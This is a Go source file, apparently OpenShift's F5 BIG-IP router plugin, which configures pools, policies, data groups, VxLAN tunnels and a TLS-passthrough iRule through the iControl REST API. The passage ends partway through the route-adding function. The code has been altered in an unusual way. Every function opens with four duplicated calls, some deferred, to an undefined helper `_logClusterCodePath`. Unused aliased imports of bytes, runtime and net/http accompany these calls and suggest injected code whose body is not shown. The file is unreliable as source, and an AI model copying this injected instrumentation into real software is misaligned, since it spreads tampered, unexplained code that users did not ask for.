package f5

import (
	"bytes"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	godefaulthttp "net/http"
	"os"
	"os/exec"
	"path"
	"strings"
	"github.com/golang/glog"
	knet "k8s.io/apimachinery/pkg/util/net"
)

const (
	F5DefaultPartitionPath	= "/Common"
	F5VxLANTunnelName	= "vxlan5000"
	F5VxLANProfileName	= "vxlan-ose"
	HTTP_CONFLICT_CODE	= 409
)

func (err F5Error) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var msg string
	if err.err != nil {
		msg = fmt.Sprintf("error: %v", err.err)
	} else if err.Message != nil {
		msg = fmt.Sprintf("HTTP code: %d; error from F5: %s", err.httpStatusCode, *err.Message)
	} else {
		msg = fmt.Sprintf("HTTP code: %d.", err.httpStatusCode)
	}
	return fmt.Sprintf("Encountered an error on %s request to URL %s: %s", err.verb, err.url, msg)
}

type passthroughRoute struct {
	hostname	string
	poolname	string
}
type reencryptRoute struct {
	hostname	string
	poolname	string
}
type f5LTM struct {
	f5LTMCfg
	poolMembers		map[string]map[string]bool
	routes			map[string]map[string]bool
	passthroughRoutes	map[string]passthroughRoute
	reencryptRoutes		map[string]reencryptRoute
}
type f5LTMCfg struct {
	host		string
	username	string
	password	string
	httpVserver	string
	httpsVserver	string
	privkey		string
	insecure	bool
	partitionPath	string
	vxlanGateway	string
	internalAddress	string
	setupOSDNVxLAN	bool
}

const (
	httpPolicyName			= "openshift_insecure_routes"
	httpsPolicyName			= "openshift_secure_routes"
	reencryptRoutesDataGroupName	= "ssl_reencrypt_route_dg"
	reencryptHostsDataGroupName	= "ssl_reencrypt_servername_dg"
	passthroughRoutesDataGroupName	= "ssl_passthrough_route_dg"
	passthroughHostsDataGroupName	= "ssl_passthrough_servername_dg"
	sslPassthroughIRuleName		= "openshift_passthrough_irule"
	sslPassthroughIRule		= `
when CLIENT_ACCEPTED {
  TCP::collect
}

when CLIENT_DATA {
  # Byte 0 is the content type.
  # Bytes 1-2 are the TLS version.
  # Bytes 3-4 are the TLS payload length.
  # Bytes 5-$tls_payload_len are the TLS payload.
  binary scan [TCP::payload] cSS tls_content_type tls_version tls_payload_len

  switch $tls_version {
    "769" -
    "770" -
    "771" {
      # Content type of 22 indicates the TLS payload contains a handshake.
      if { $tls_content_type == 22 } {
        # Byte 5 (the first byte of the handshake) indicates the handshake
        # record type, and a value of 1 signifies that the handshake record is
        # a ClientHello.
        binary scan [TCP::payload] @5c tls_handshake_record_type
        if { $tls_handshake_record_type == 1 } {
          # Bytes 6-8 are the handshake length (which we ignore).
          # Bytes 9-10 are the TLS version (which we ignore).
          # Bytes 11-42 are random data (which we ignore).

          # Byte 43 is the session ID length.  Following this are three
          # variable-length fields which we shall skip over.
          set record_offset 43

          # Skip the session ID.
          binary scan [TCP::payload] @${record_offset}c tls_session_id_len
          incr record_offset [expr {1 + $tls_session_id_len}]

          # Skip the cipher_suites field.
          binary scan [TCP::payload] @${record_offset}S tls_cipher_suites_len
          incr record_offset [expr {2 + $tls_cipher_suites_len}]

          # Skip the compression_methods field.
          binary scan [TCP::payload] @${record_offset}c tls_compression_methods_len
          incr record_offset [expr {1 + $tls_compression_methods_len}]

          # Get the number of extensions, and store the extensions.
          binary scan [TCP::payload] @${record_offset}S tls_extensions_len
          incr record_offset 2
          binary scan [TCP::payload] @${record_offset}a* tls_extensions

          for { set extension_start 0 }
              { $tls_extensions_len - $extension_start == abs($tls_extensions_len - $extension_start) }
              { incr extension_start 4 } {
            # Bytes 0-1 of the extension are the extension type.
            # Bytes 2-3 of the extension are the extension length.
            binary scan $tls_extensions @${extension_start}SS extension_type extension_len

            # Extension type 00 is the ServerName extension.
            if { $extension_type == "00" } {
              # Bytes 4-5 of the extension are the SNI length (we ignore this).

              # Byte 6 of the extension is the SNI type.
              set sni_type_offset [expr {$extension_start + 6}]
              binary scan $tls_extensions @${sni_type_offset}S sni_type

              # Type 0 is host_name.
              if { $sni_type == "0" } {
                # Bytes 7-8 of the extension are the SNI data (host_name)
                # length.
                set sni_len_offset [expr {$extension_start + 7}]
                binary scan $tls_extensions @${sni_len_offset}S sni_len

                # Bytes 9-$sni_len are the SNI data (host_name).
                set sni_start [expr {$extension_start + 9}]
                binary scan $tls_extensions @${sni_start}A${sni_len} tls_servername
              }
            }

            incr extension_start $extension_len
          }

          if { [info exists tls_servername] } {
            set servername_lower [string tolower $tls_servername]
            SSL::disable serverside
            if { [class match $servername_lower equals ssl_passthrough_servername_dg] } {
              pool [class match -value $servername_lower equals ssl_passthrough_servername_dg]
              SSL::disable
              HTTP::disable
            }
            elseif { [class match $servername_lower equals ssl_reencrypt_servername_dg] } {
              pool [class match -value $servername_lower equals ssl_reencrypt_servername_dg]
              SSL::enable serverside
            }
          }
        }
      }
    }
  }

  TCP::release
}
`
)

func newF5LTM(cfg f5LTMCfg) (*f5LTM, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if cfg.insecure == true {
		glog.Warning("Strict certificate verification is *DISABLED*")
	}
	if cfg.httpVserver == "" {
		glog.Warning("No vserver was specified for HTTP connections;" + " HTTP routes will not be configured")
	}
	if cfg.httpsVserver == "" {
		glog.Warning("No vserver was specified for HTTPS connections;" + " HTTPS routes will not be configured")
	}
	privkeyFileName := ""
	if cfg.privkey == "" {
		glog.Warning("No SSH key provided for the F5 BIG-IP host;" + " TLS configuration for applications is disabled")
	} else {
		oldPrivkeyFile, err := os.Open(cfg.privkey)
		if err != nil {
			glog.Errorf("Error opening file for F5 BIG-IP private key"+" from secrets volume: %v", err)
			return nil, err
		}
		newPrivkeyFile, err := ioutil.TempFile("", "privkey")
		if err != nil {
			glog.Errorf("Error creating tempfile for F5 BIG-IP private key: %v", err)
			return nil, err
		}
		_, err = io.Copy(newPrivkeyFile, oldPrivkeyFile)
		if err != nil {
			glog.Errorf("Error writing private key for F5 BIG-IP to tempfile: %v", err)
			return nil, err
		}
		err = oldPrivkeyFile.Close()
		if err != nil {
			glog.Warningf("Error closing file for private key for F5 BIG-IP"+" from secrets volume: %v", err)
		}
		err = newPrivkeyFile.Close()
		if err != nil {
			glog.Errorf("Error closing tempfile for private key for F5 BIG-IP: %v", err)
			return nil, err
		}
		err = os.Chmod(newPrivkeyFile.Name(), 0400)
		if err != nil {
			glog.Warningf("Could not chmod the tempfile for F5 BIG-IP"+" private key: %v", err)
		}
		privkeyFileName = newPrivkeyFile.Name()
	}
	partitionPath := F5DefaultPartitionPath
	if len(cfg.partitionPath) > 0 {
		partitionPath = cfg.partitionPath
	}
	partitionPath = path.Join("/", partitionPath)
	setupOSDNVxLAN := (len(cfg.vxlanGateway) != 0 && len(cfg.internalAddress) != 0)
	router := &f5LTM{f5LTMCfg: f5LTMCfg{host: cfg.host, username: cfg.username, password: cfg.password, httpVserver: cfg.httpVserver, httpsVserver: cfg.httpsVserver, privkey: privkeyFileName, insecure: cfg.insecure, partitionPath: partitionPath, vxlanGateway: cfg.vxlanGateway, internalAddress: cfg.internalAddress, setupOSDNVxLAN: setupOSDNVxLAN}, poolMembers: map[string]map[string]bool{}, routes: map[string]map[string]bool{}}
	return router, nil
}
func (f5 *f5LTM) restRequest(verb string, url string, payload io.Reader, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	tr := knet.SetTransportDefaults(&http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: f5.insecure}})
	errorResult := F5Error{verb: verb, url: url}
	req, err := http.NewRequest(verb, url, payload)
	if err != nil {
		errorResult.err = fmt.Errorf("http.NewRequest failed: %v", err)
		return errorResult
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.SetBasicAuth(f5.username, f5.password)
	client := &http.Client{Transport: tr}
	glog.V(4).Infof("Request sent: %v\n", req)
	resp, err := client.Do(req)
	if err != nil {
		errorResult.err = fmt.Errorf("client.Do failed: %v", err)
		return errorResult
	}
	defer resp.Body.Close()
	errorResult.httpStatusCode = resp.StatusCode
	decoder := json.NewDecoder(resp.Body)
	if resp.StatusCode >= 400 {
		decoder.Decode(&errorResult)
		return errorResult
	} else if result != nil {
		err = decoder.Decode(result)
		if err != nil {
			errorResult.err = fmt.Errorf("Decoder.Decode failed: %v", err)
			return errorResult
		}
	}
	return nil
}
func (f5 *f5LTM) restRequestPayload(verb string, url string, payload interface{}, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	jsonStr, err := json.Marshal(payload)
	if err != nil {
		return F5Error{verb: verb, url: url, err: err}
	}
	encodedPayload := bytes.NewBuffer(jsonStr)
	return f5.restRequest(verb, url, encodedPayload, result)
}
func (f5 *f5LTM) get(url string, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.restRequest("GET", url, nil, result)
}
func (f5 *f5LTM) post(url string, payload interface{}, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.restRequestPayload("POST", url, payload, result)
}
func (f5 *f5LTM) patch(url string, payload interface{}, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.restRequestPayload("PATCH", url, payload, result)
}
func (f5 *f5LTM) delete(url string, result interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.restRequest("DELETE", url, nil, result)
}
func encodeiControlUriPathComponent(pathName string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.Replace(pathName, "/", "~", -1)
}
func (f5 *f5LTM) iControlUriResourceId(resourceName string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourcePath := path.Join(f5.partitionPath, resourceName)
	return encodeiControlUriPathComponent(resourcePath)
}
func (f5 *f5LTM) ensureVxLANTunnel() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking and installing VxLAN setup")
	url := fmt.Sprintf("https://%s/mgmt/tm/net/tunnels/vxlan", f5.host)
	profilePayload := f5CreateVxLANProfilePayload{Name: F5VxLANProfileName, Partition: f5.partitionPath, FloodingType: "multipoint", Port: 4789}
	err := f5.post(url, profilePayload, nil)
	if err != nil && err.(F5Error).httpStatusCode != HTTP_CONFLICT_CODE {
		glog.V(4).Infof("Error while creating vxlan tunnel - %v", err)
		return err
	}
	url = fmt.Sprintf("https://%s/mgmt/tm/net/tunnels/tunnel", f5.host)
	tunnelPayload := f5CreateVxLANTunnelPayload{Name: F5VxLANTunnelName, Partition: f5.partitionPath, Key: 0, LocalAddress: f5.internalAddress, Mode: "bidirectional", Mtu: "0", Profile: path.Join(f5.partitionPath, F5VxLANProfileName), Tos: "preserve", Transparent: "disabled", UsePmtu: "enabled"}
	err = f5.post(url, tunnelPayload, nil)
	if err != nil && err.(F5Error).httpStatusCode != HTTP_CONFLICT_CODE {
		return err
	}
	selfUrl := fmt.Sprintf("https://%s/mgmt/tm/net/self", f5.host)
	netSelfPayload := f5CreateNetSelfPayload{Name: f5.vxlanGateway, Partition: f5.partitionPath, Address: f5.vxlanGateway, AddressSource: "from-user", Floating: "disabled", InheritedTrafficGroup: "false", TrafficGroup: path.Join("/Common", "traffic-group-local-only"), Unit: 0, Vlan: path.Join(f5.partitionPath, F5VxLANTunnelName), AllowService: "all"}
	err = f5.post(selfUrl, netSelfPayload, nil)
	if err != nil && err.(F5Error).httpStatusCode != HTTP_CONFLICT_CODE {
		return err
	}
	return nil
}
func (f5 *f5LTM) ensurePolicyExists(policyName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking whether policy %s exists...", policyName)
	policyResourceId := f5.iControlUriResourceId(policyName)
	policyUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s", f5.host, policyResourceId)
	err := f5.get(policyUrl, nil)
	if err != nil && err.(F5Error).httpStatusCode != 404 {
		return err
	}
	if err == nil {
		glog.V(4).Infof("Policy %s already exists; nothing to do.", policyName)
		return nil
	}
	glog.V(4).Infof("Policy %s does not exist; creating it now...", policyName)
	policiesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy", f5.host)
	policyPath := path.Join(f5.partitionPath, policyName)
	if f5.setupOSDNVxLAN {
		policyPayload := f5Ver12Policy{Name: policyPath, TmPartition: f5.partitionPath, Controls: []string{"forwarding"}, Requires: []string{"http"}, Strategy: "best-match", Legacy: true}
		err = f5.post(policiesUrl, policyPayload, nil)
	} else {
		policyPayload := f5Policy{Name: policyPath, Partition: f5.partitionPath, Controls: []string{"forwarding"}, Requires: []string{"http"}, Strategy: "best-match"}
		err = f5.post(policiesUrl, policyPayload, nil)
	}
	if err != nil {
		return err
	}
	glog.V(4).Infof("Policy %s created.  Adding no-op rule...", policyName)
	rulesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules", f5.host, policyResourceId)
	rulesPayload := f5Rule{Name: "default_noop"}
	err = f5.post(rulesUrl, rulesPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("No-op rule added to policy %s.", policyName)
	return nil
}
func (f5 *f5LTM) ensureVserverHasPolicy(vserverName, policyName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking whether vserver %s has policy %s...", vserverName, policyName)
	vserverResourceId := f5.iControlUriResourceId(vserverName)
	vserverPoliciesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s/policies", f5.host, vserverResourceId)
	res := f5VserverPolicies{}
	err := f5.get(vserverPoliciesUrl, &res)
	if err != nil {
		return err
	}
	policyPath := path.Join(f5.partitionPath, policyName)
	for _, policy := range res.Policies {
		if policy.FullPath == policyPath {
			glog.V(4).Infof("Vserver %s has policy %s associated with it;"+" nothing to do.", vserverName, policyName)
			return nil
		}
	}
	glog.V(4).Infof("Adding policy %s to vserver %s...", policyName, vserverName)
	vserverPoliciesPayload := f5VserverPolicy{Name: policyPath, Partition: f5.partitionPath}
	err = f5.post(vserverPoliciesUrl, vserverPoliciesPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Policy %s added to vserver %s.", policyName, vserverName)
	return nil
}
func (f5 *f5LTM) ensureDatagroupExists(datagroupName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking whether datagroup %s exists...", datagroupName)
	datagroupUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, datagroupName)
	err := f5.get(datagroupUrl, nil)
	if err != nil && err.(F5Error).httpStatusCode != 404 {
		return err
	}
	if err == nil {
		glog.V(4).Infof("Datagroup %s exists; nothing to do.", datagroupName)
		return nil
	}
	glog.V(4).Infof("Creating datagroup %s...", datagroupName)
	datagroupsUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal", f5.host)
	datagroupPayload := f5Datagroup{Name: datagroupName, Type: "string"}
	err = f5.post(datagroupsUrl, datagroupPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Datagroup %s created.", datagroupName)
	return nil
}
func (f5 *f5LTM) ensureIRuleExists(iRuleName, iRule string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking whether iRule %s exists...", iRuleName)
	iRuleUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/rule/%s", f5.host, f5.iControlUriResourceId(iRuleName))
	err := f5.get(iRuleUrl, nil)
	if err != nil && err.(F5Error).httpStatusCode != 404 {
		return err
	}
	if err == nil {
		glog.V(4).Infof("iRule %s already exists; nothing to do.", iRuleName)
		return nil
	}
	glog.V(4).Infof("IRule %s does not exist; creating it now...", iRuleName)
	iRulesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/rule", f5.host)
	iRulePayload := f5IRule{Name: iRuleName, Partition: f5.partitionPath, Code: iRule}
	err = f5.post(iRulesUrl, iRulePayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("IRule %s created.", iRuleName)
	return nil
}
func (f5 *f5LTM) ensureVserverHasIRule(vserverName, iRuleName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking whether vserver %s has iRule %s...", vserverName, iRuleName)
	vserverUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s", f5.host, f5.iControlUriResourceId(vserverName))
	res := f5VserverIRules{}
	err := f5.get(vserverUrl, &res)
	if err != nil {
		return err
	}
	commonIRuleName := path.Join("/", f5.partitionPath, iRuleName)
	for _, name := range res.Rules {
		if name == commonIRuleName {
			glog.V(4).Infof("Vserver %s has iRule %s associated with it;"+" nothing to do.", vserverName, iRuleName)
			return nil
		}
	}
	glog.V(4).Infof("Adding iRule %s to vserver %s...", iRuleName, vserverName)
	sslPassthroughIRulePath := path.Join(f5.partitionPath, sslPassthroughIRuleName)
	vserverRulesPayload := f5VserverIRules{Rules: []string{sslPassthroughIRulePath}}
	err = f5.patch(vserverUrl, vserverRulesPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("IRule %s added to vserver %s.", iRuleName, vserverName)
	return nil
}
func (f5 *f5LTM) checkPartitionPathExists(pathName string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Checking if partition path %q exists...", pathName)
	uri := fmt.Sprintf("https://%s/mgmt/tm/sys/folder/%s", f5.host, encodeiControlUriPathComponent(pathName))
	err := f5.get(uri, nil)
	if err != nil {
		if err.(F5Error).httpStatusCode != 404 {
			glog.Errorf("partition path %q error: %v", pathName, err)
			return false, err
		}
		return false, nil
	}
	glog.V(4).Infof("Partition path %q exists.", pathName)
	return true, nil
}
func (f5 *f5LTM) addPartitionPath(pathName string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Creating partition path %q ...", pathName)
	uri := fmt.Sprintf("https://%s/mgmt/tm/sys/folder", f5.host)
	payload := f5AddPartitionPathPayload{Name: pathName}
	err := f5.post(uri, payload, nil)
	if err != nil {
		if err.(F5Error).httpStatusCode != HTTP_CONFLICT_CODE {
			glog.Errorf("Error adding partition path %q error: %v", pathName, err)
			return false, err
		}
		glog.Warningf("Partition path %q not added as it already exists.", pathName)
		return false, nil
	}
	return true, nil
}
func (f5 *f5LTM) ensurePartitionPathExists(pathName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Ensuring partition path %s exists...", pathName)
	exists, err := f5.checkPartitionPathExists(pathName)
	if err != nil {
		return err
	}
	if exists {
		return nil
	}
	p := "/"
	pathComponents := strings.Split(path.Join("/", pathName)[1:], "/")
	for _, v := range pathComponents {
		p = path.Join(p, v)
		exists, err := f5.checkPartitionPathExists(p)
		if err != nil {
			return err
		}
		if !exists {
			if _, err := f5.addPartitionPath(p); err != nil {
				return err
			}
		}
	}
	glog.V(4).Infof("Partition path %s added.", pathName)
	return nil
}
func (f5 *f5LTM) Initialize() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := f5.ensurePartitionPathExists(f5.partitionPath)
	if err != nil {
		return err
	}
	err = f5.ensurePolicyExists(httpPolicyName)
	if err != nil {
		return err
	}
	if f5.httpVserver != "" {
		err = f5.ensureVserverHasPolicy(f5.httpVserver, httpPolicyName)
		if err != nil {
			return err
		}
	}
	err = f5.ensurePolicyExists(httpsPolicyName)
	if err != nil {
		return err
	}
	err = f5.ensureDatagroupExists(reencryptRoutesDataGroupName)
	if err != nil {
		return err
	}
	err = f5.ensureDatagroupExists(reencryptHostsDataGroupName)
	if err != nil {
		return err
	}
	err = f5.ensureDatagroupExists(passthroughRoutesDataGroupName)
	if err != nil {
		return err
	}
	err = f5.ensureDatagroupExists(passthroughHostsDataGroupName)
	if err != nil {
		return err
	}
	if f5.httpsVserver != "" {
		err = f5.ensureVserverHasPolicy(f5.httpsVserver, httpsPolicyName)
		if err != nil {
			return err
		}
		err = f5.ensureIRuleExists(sslPassthroughIRuleName, sslPassthroughIRule)
		if err != nil {
			return err
		}
		err = f5.ensureVserverHasIRule(f5.httpsVserver, sslPassthroughIRuleName)
		if err != nil {
			return err
		}
	}
	if f5.setupOSDNVxLAN {
		err = f5.ensureVxLANTunnel()
		if err != nil {
			return err
		}
	}
	glog.V(4).Infof("F5 initialization is complete.")
	return nil
}
func checkIPAndGetMac(ipStr string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	ip := net.ParseIP(ipStr)
	if ip == nil {
		errStr := fmt.Sprintf("vtep IP '%s' is not a valid IP address", ipStr)
		glog.Warning(errStr)
		return "", fmt.Errorf(errStr)
	}
	ip4 := ip.To4()
	if ip4 == nil {
		errStr := fmt.Sprintf("vtep IP '%s' is not a valid IPv4 address", ipStr)
		glog.Warning(errStr)
		return "", fmt.Errorf(errStr)
	}
	macAddr := fmt.Sprintf("0a:0a:%02x:%02x:%02x:%02x", ip4[0], ip4[1], ip4[2], ip4[3])
	return macAddr, nil
}
func (f5 *f5LTM) AddVtep(ipStr string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !f5.setupOSDNVxLAN {
		return nil
	}
	macAddr, err := checkIPAndGetMac(ipStr)
	if err != nil {
		return err
	}
	err = f5.ensurePartitionPathExists(f5.partitionPath)
	if err != nil {
		return err
	}
	url := fmt.Sprintf("https://%s/mgmt/tm/net/fdb/tunnel/%s~%s/records", f5.host, strings.Replace(f5.partitionPath, "/", "~", -1), F5VxLANTunnelName)
	payload := f5AddFDBRecordPayload{Name: macAddr, Endpoint: ipStr}
	err = f5.post(url, payload, nil)
	if err != nil && err.(F5Error).httpStatusCode != HTTP_CONFLICT_CODE {
		return err
	}
	return nil
}
func (f5 *f5LTM) RemoveVtep(ipStr string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !f5.setupOSDNVxLAN {
		return nil
	}
	macAddr, err := checkIPAndGetMac(ipStr)
	if err != nil {
		return err
	}
	err = f5.ensurePartitionPathExists(f5.partitionPath)
	if err != nil {
		return err
	}
	url := fmt.Sprintf("https://%s/mgmt/tm/net/fdb/tunnel/%s~%s/records/%s", f5.host, strings.Replace(f5.partitionPath, "/", "~", -1), F5VxLANTunnelName, macAddr)
	return f5.delete(url, nil)
}
func (f5 *f5LTM) CreatePool(poolname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/pool", f5.host)
	payload := f5Pool{Mode: "round-robin", Monitor: "min 1 of /Common/http /Common/https", Partition: f5.partitionPath, Name: poolname}
	err := f5.post(url, payload, nil)
	if err != nil {
		return err
	}
	f5.poolMembers[poolname] = map[string]bool{}
	glog.V(4).Infof("Pool %s created.", poolname)
	return nil
}
func (f5 *f5LTM) DeletePool(poolname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/pool/%s", f5.host, f5.iControlUriResourceId(poolname))
	err := f5.delete(url, nil)
	if err != nil {
		return err
	}
	delete(f5.poolMembers, poolname)
	glog.V(4).Infof("Pool %s deleted.", poolname)
	return nil
}
func (f5 *f5LTM) GetPoolMembers(poolname string) (map[string]bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	members, ok := f5.poolMembers[poolname]
	if ok {
		return members, nil
	}
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/pool/%s/members", f5.host, f5.iControlUriResourceId(poolname))
	res := f5PoolMemberset{}
	err := f5.get(url, &res)
	if err != nil {
		return nil, err
	}
	f5.poolMembers[poolname] = map[string]bool{}
	for _, member := range res.Members {
		f5.poolMembers[poolname][member.Name] = true
	}
	return f5.poolMembers[poolname], nil
}
func (f5 *f5LTM) PoolExists(poolname string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := f5.GetPoolMembers(poolname)
	if err == nil {
		return true, nil
	}
	if err.(F5Error).httpStatusCode == 404 {
		return false, nil
	}
	return false, err
}
func (f5 *f5LTM) PoolHasMember(poolname, member string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	members, err := f5.GetPoolMembers(poolname)
	if err != nil {
		return false, err
	}
	return members[member], nil
}
func (f5 *f5LTM) AddPoolMember(poolname, member string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	hasMember, err := f5.PoolHasMember(poolname, member)
	if err != nil {
		return err
	}
	if hasMember {
		glog.V(4).Infof("Pool %s already has member %s.\n", poolname, member)
		return nil
	}
	glog.V(4).Infof("Adding pool member %s to pool %s.", member, poolname)
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/pool/%s/members", f5.host, f5.iControlUriResourceId(poolname))
	payload := f5PoolMember{Name: member}
	err = f5.post(url, payload, nil)
	if err != nil {
		return err
	}
	members, err := f5.GetPoolMembers(poolname)
	if err != nil {
		return err
	}
	members[member] = true
	glog.V(4).Infof("Added pool member %s to pool %s.", member, poolname)
	return nil
}
func (f5 *f5LTM) DeletePoolMember(poolname, member string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	hasMember, err := f5.PoolHasMember(poolname, member)
	if err != nil {
		return err
	}
	if !hasMember {
		glog.V(4).Infof("Pool %s does not have member %s.\n", poolname, member)
		return nil
	}
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/pool/%s/members/%s", f5.host, f5.iControlUriResourceId(poolname), member)
	err = f5.delete(url, nil)
	if err != nil {
		return err
	}
	delete(f5.poolMembers[poolname], member)
	glog.V(4).Infof("Pool member %s deleted from pool %s.", member, poolname)
	return nil
}
func (f5 *f5LTM) getRoutes(policyname string) (map[string]bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, ok := f5.routes[policyname]
	if ok {
		return routes, nil
	}
	url := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules", f5.host, f5.iControlUriResourceId(policyname))
	res := f5PolicyRuleset{}
	err := f5.get(url, &res)
	if err != nil {
		return nil, err
	}
	routes = map[string]bool{}
	for _, rule := range res.Rules {
		routes[rule.Name] = true
	}
	f5.routes[policyname] = routes
	return routes, nil
}
func (f5 *f5LTM) routeExists(policyname, routename string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getRoutes(policyname)
	if err != nil {
		return false, err
	}
	return routes[routename], nil
}
func (f5 *f5LTM) InsecureRouteExists(routename string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.routeExists(httpPolicyName, routename)
}
func (f5 *f5LTM) SecureRouteExists(routename string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.routeExists(httpsPolicyName, routename)
}
func (f5 *f5LTM) ReencryptRouteExists(routename string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getReencryptRoutes()
	if err != nil {
		return false, err
	}
	_, ok := routes[routename]
	return ok, nil
}
func (f5 *f5LTM) PassthroughRouteExists(routename string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getPassthroughRoutes()
	if err != nil {
		return false, err
	}
	_, ok := routes[routename]
	return ok, nil
}
func (f5 *f5LTM) addRoute(policyname, routename, poolname, hostname, pathname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	success := false
	policyResourceId := f5.iControlUriResourceId(policyname)
	rulesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules", f5.host, policyResourceId)
	rulesPayload := f5Rule{Name: routename}
	err := f5.post(rulesUrl, rulesPayload, nil)
	if err != nil {
		if err.(F5Error).httpStatusCode == HTTP_CONFLICT_CODE {
			glog.V(4).Infof("Warning: Rule %s already exists; continuing with"+" initialization in case the existing rule is only partially"+" initialized...", routename)
		} else {
			return err
		}
	}
	defer func() {
		if success != true {
			err := f5.deleteRoute(policyname, routename)
			if err != nil && err.(F5Error).httpStatusCode != 404 {
				glog.V(4).Infof("Warning: Creating rule %s failed,"+" and then cleanup got an error: %v", routename, err)
			}
		}
